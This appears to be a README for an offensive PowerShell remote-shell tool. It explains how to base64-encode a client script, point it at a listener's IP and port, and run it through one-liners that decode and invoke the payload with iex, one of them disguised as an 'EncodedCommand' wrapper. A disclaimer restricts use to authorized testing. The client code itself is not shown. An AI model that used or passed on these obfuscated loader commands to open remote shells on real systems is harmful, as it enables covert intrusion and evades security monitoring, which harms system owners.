Use Client.ps by encoding it with https://www.base64encode.org/ use UTF16-LE and CRLF(Windows) Make change in ip and port in code keep genrated cert files in same directory where listener is present.
To execute the encoded code use iex([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('Base64EncodedCode')))
To execute the encoded code use function Connect{param([Alias('e','EncodedCommand')][string]$Via);iex([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($Via)))};Connect -Via Base64Code

## Disclaimer

This repository and its contents are provided for authorized testing, research, and educational use only. Use on any system, network, or environment without explicit, written permission from the owner is prohibited and may be illegal. The author and contributors accept no liability for misuse, damage, data loss, or legal consequences arising from use of the materials here. 

Before using any code or artifacts from this repository you must:
- Obtain written authorization that defines scope and timeframe.  
- Run all testing in isolated, non-production environments under full monitoring.  
- Inspect and validate all decoded or generated content before execution.  
- Comply with all applicable laws, regulations, and organizational policies.

If you do not have explicit authorization, do not use these materials. Seek legal counsel for clarity on permitted activities.
